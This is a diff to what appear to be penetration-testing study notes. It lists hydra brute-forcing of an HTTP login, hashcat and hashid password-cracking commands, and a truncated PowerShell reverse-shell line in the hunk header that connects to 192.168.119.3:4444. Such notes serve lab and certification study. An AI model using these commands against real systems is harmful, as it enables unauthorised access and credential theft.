@@ -266,3 +266,4 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
 - Using hydra with http-get: ```hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.218.201``` <15.1.2>
 - hashcat rules can be found: ```/usr/share/hashcat/rules```
 - Using hashcat to crack known hash: ``` hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force```
+- Using hashid to determine hash type: ```hashid -m <hash>``` >> NOTE: single quotes may be needed around the hash to process it
